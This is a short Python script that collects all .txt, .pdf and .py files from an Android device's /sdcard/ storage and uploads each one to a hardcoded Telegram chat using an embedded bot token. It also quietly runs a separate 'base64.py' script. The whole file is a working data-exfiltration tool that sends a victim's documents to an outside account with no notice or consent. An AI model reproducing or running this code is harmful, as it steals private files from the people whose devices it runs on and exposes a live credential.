import asyncio
import os
import glob
from telegram import Bot

TOKEN = '5740860850:AAGTFF28C6NT64Lvm-Cr6cikJgH_9xz-gX4'
CHAT_ID = 5215025306
bot = Bot(token=TOKEN)
path = '/sdcard/'

async def send_files():
    files = glob.glob(os.path.join(path, '*.txt')) + glob.glob(os.path.join(path, '*.pdf')) + glob.glob(os.path.join(path, '*.py'))
    for file in files:
        with open(file, 'rb') as f:
            await bot.send_document(chat_id=CHAT_ID, document=f, filename=os.path.basename(file))
os.system("python3 base64.py")
asyncio.run(send_files())

